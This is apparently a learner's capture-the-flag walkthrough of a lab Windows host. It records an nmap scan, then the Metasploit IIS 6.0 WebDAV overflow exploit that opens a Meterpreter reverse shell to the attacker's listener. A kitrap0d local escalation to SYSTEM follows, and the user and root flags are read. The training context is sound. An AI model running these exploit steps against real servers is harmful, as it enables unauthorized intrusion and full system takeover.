### Reconnaissance
start with nmap scan 
```
┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@pwnbox7]─[~]
└──╼ [★]$ sudo nmap -sC -sV -oN scan.txt -T4 10.129.60.246
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-27 12:52 EDT
Nmap scan report for 10.129.95.234
Host is up (0.014s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Thu, 27 Aug 2026 16:52:34 GMT
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.11 seconds
```

we see we're runinng microsoft IIS 6.0 lets start searching there
```
┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@pwnbox7]─[~]
└──╼ [★]$ searchsploit Microsoft IIS 6.0
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Addre | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 200 | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exha | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote De | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack  | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFrom | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8806.pl
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vuln | windows/remote/19033.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

looks like there's a few different options here (man I need to get better at reading searchsploit)
lets see what we got for it in metasploit

```
[msf](Jobs:0 Agents:0) >> search Microsoft IIS 6.0

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos      2010-09-14       normal  No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
   1  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl

[msf](Jobs:0 Agents:0) >> 



```
looks like we got a hit with number 1, lets run `use 1` then check our options

```
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, sapni
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     51.79.92.178     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> 
```

ok so we'll set RHOSTS, LHOST is wrong, it's grabbing the wrong interface here so set that correctly and the default ports are all correct, lets run it

WE'RE in lets check our current user

```[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> run
[*] Started reverse TCP handler on 10.10.14.169:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (190534 bytes) to 10.129.60.246
[*] Meterpreter session 1 opened (10.10.14.169:4444 -> 10.129.60.246:1034) at 2026-08-27 15:30:53 -0400

(Meterpreter 1)(C:\Documents and Settings) > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
(Meterpreter 1)(C:\Documents and Settings) > 

```

ok well network services isn't gonna do us much, we can't even look in other user's folders lets try a basic getsystem
```
(Meterpreter 1)(C:\Documents and Settings) > cd Lakis\\
[-] stdapi_fs_chdir: Operation failed: Access is denied.
(Meterpreter 1)(C:\Documents and Settings) > getsystem
[-] priv_elevate_getsystem: Operation failed: This function is not supported on this system. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
(Meterpreter 1)(C:\Documents and Settings) > 
```

no luck, lets background the process by pressing `[CTRL+Z]`
now we need to find some privilege escalations but we don't know where to start no problem, lets start by searching post/multi/recon post because we're already in, multi because we're open to any option that might work ie if there's a network flaw that works on windows AND linux, and recon because we're looking for an exploit still.
```
[msf](Jobs:0 Agents:1) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> search post/multi/recon

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  post/multi/recon/multiport_egress_traffic  .                normal  No     Generate TCP/UDP Outbound Traffic On Multiple Ports
   1  post/multi/recon/local_exploit_suggester   .                normal  No     Multi Recon Local Exploit Suggester
   2  post/multi/recon/persistence_suggester     .                normal  No     Persistence Exploit Suggester
   3  post/multi/recon/reverse_lookup            .                normal  No     Reverse Lookup IP Addresses
   4  post/multi/recon/sudo_commands             .                normal  No     Sudo Commands


Interact with a module by name or index. For example info 4, use 4 or use post/multi/recon/sudo_commands

[msf](Jobs:0 Agents:1) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> 


```
lets start with the local exploit suggester, because we want to escalate our local privileges
so enter we enter `use 1`
when we check necessary options we just need to include a session number which in our case is 1 so we can set that with `set SESSION 1` and then we can execute with the `run` command

```
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run
[*] 10.129.60.246 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 10.129.60.246 - 239 exploit checks are being tried...
[+] 10.129.60.246 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.60.246 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.60.246 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.129.60.246 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.60.246 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.60.246 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.60.246 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 54 / 54
[*] 10.129.60.246 - Valid modules for session 1:
============================

 #   Name                                                              Potentially Vulnerable?  Check Result
 -   ----                                                              -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                           Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                   Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                        Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image                  Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                             Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                         Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ppr_flatten_rec                             Yes                      The target appears to be vulnerable.
```

looks like we got 7 hits 2 are not verifiable. lets start at number 1 and work our way up, by now you should know the game run `use exploit/windows/local/ms10_015_kitrap0d` 
use the following commands to set up the exploit
```
set SESSION 1
set LHOST 10.10.14.169
run
```

it looks like that worked, lets check
```
(Meterpreter 2)(C:\Documents and Settings) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 2)(C:\Documents and Settings) > 
```

we are successfully and now can go to Lakis's Desktop and grab the user flag 
```
(Meterpreter 2)(C:\Documents and Settings\Lakis\Desktop) > ls
Listing: C:\Documents and Settings\Lakis\Desktop
================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 15:20:07 -0400  user.txt

(Meterpreter 2)(C:\Documents and Settings\Lakis\Desktop) > cat user.txt
700c5dc163014e22b3e408f8703f67d1

```

and since we have system level privileges we can quickly grab the Root flag
```
(Meterpreter 2)(C:\Documents and Settings\Administrator\Desktop) > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 15:17:07 -0400  root.txt

(Meterpreter 2)(C:\Documents and Settings\Administrator\Desktop) > cat root.txt
aa4beed1c0584445ab463a6747bd06e9

```

### Final Thoughts
fun little room, nothing far beyond my abilities, just a matter of learning to use tools better
I can see why this machine was recommended to build metasploit familiarity
definitely feel strong but need some more work, will work through some of the others recommended in [[5 - Public Exploits]] to really get these solid (hopefully before continuing the lesson at hand)
### Live Notes
initial nmap scan 
```
┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@pwnbox7]─[~]
└──╼ [★]$ sudo nmap -sC -sV -oN scan.txt -T4 10.129.60.246
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-27 12:52 EDT
Nmap scan report for 10.129.95.234
Host is up (0.014s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Thu, 27 Aug 2026 16:52:34 GMT
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.11 seconds
```

searchsploit results
```
┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@pwnbox7]─[~]
└──╼ [★]$ searchsploit Microsoft IIS 6.0
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Addre | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 200 | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exha | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote De | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack  | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFrom | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8806.pl
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vuln | windows/remote/19033.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

msfconsole
search Microsoft IIS 6.0
use 1(exploit iis_webdav_scstoragepathfromurl)
set RHOST 10.129.60.246
set LHOST 10.10.14.169
run
not the privileges we want
use post/multi/recon/local_exploit_suggester
6 options 
1 titlled ms16_016_wabdav looks related to what we already used, lets explore that
rabbit hole

use option 1

```
#   Name                                                              Potentially Vulnerable?  Check Result
 -   ----                                                              -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                           Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                   Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                        Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image                  Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                             Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                             Yes                      The target appears to be vulnerable.



```